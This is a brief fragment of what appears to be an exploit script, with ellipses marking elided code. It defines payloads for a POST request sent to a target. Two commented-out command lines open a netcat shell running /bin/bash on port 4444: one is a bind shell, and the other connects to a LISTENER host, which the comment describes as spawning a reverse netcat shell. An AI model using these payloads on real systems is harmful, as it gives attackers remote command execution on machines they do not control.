...
#The following variables are defined as headers for our POST request.
    ...
    #Command = "/bin/nc.traditional -l -p 4444 -e /bin/bash"
    #Command = "/bin/nc " + LISTENER + " -l -p 4444 -e /bin/bash" #uncomment this line if you want to spawn a reverse netcat shell
